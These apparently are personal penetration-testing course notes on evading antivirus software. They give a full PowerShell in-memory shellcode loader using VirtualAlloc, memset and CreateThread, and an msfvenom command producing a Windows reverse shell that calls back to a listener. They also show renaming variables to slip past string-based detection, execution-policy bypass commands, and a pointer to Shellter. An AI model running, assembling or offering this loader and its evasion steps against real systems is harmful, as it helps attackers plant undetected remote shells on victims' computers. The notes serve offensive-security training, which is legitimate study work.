If we want to test our AV evasion techniques we can use Antiscan.me which is like virus total, but doesn't submit the malware.
We can also stand up an emulated environment with whatever AV we are trying to evaded to practice --> if we do this be sure to turn off sample submission

## Evading AV with thread injection
A powerful feature of powershell is that it can interact with the windows API
We can script the remote process memory injection in powershell
```Powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```
The script starts by importing VirtualALloc and CreateThread from kernel32.dll as well as memset from msvcrt.dll

The script then starts by allocating a buffer called winFunc and copying in the shell code byte by byte

The final executes the payload written to memory by using the createThread API

Now we can create a payload for our script and paste it in
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
```

We copy in the payload generated and now we can use virustotal to see how evasive the script is --> 29 of 57 vendors still flag as malicious

For text files many AV solutions rely on analyzing the strings found in the script --> we can rename variables to generic names to further avoid AV

```Powershell
$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

[Byte[]];   
[Byte[]] $var1 = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
...

$size = 0x1000;

if ($var1.Length -gt 0x1000) {$size = $var1.Length};

$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};

$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

Here we renamed the hardcoded win32 classname for Add-Type to iWin32. Additionally, we renamed sc and winFunc variables to var 1 and var 2

This evades the Avira AV software

SInce our payload is for x86 Architecture, we need to launch the x86 version of powershell.
When we go to execute the script we get an error on script execution policy of the system
To change the policy on a per script basis we can use -ExecutionPolicy Bypass when running the script
to change the policy globally we can run
```Powershell
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```
**Note if execution Policy is set by Active Directory GPOs we may not be able to change it. In this case we need to look for different avenues of attack**

## Automating the Process
Shellter is a dynaimc shell code injection tool and one of the most popular free tools capable of bypassing AV software

Install shellter and wine
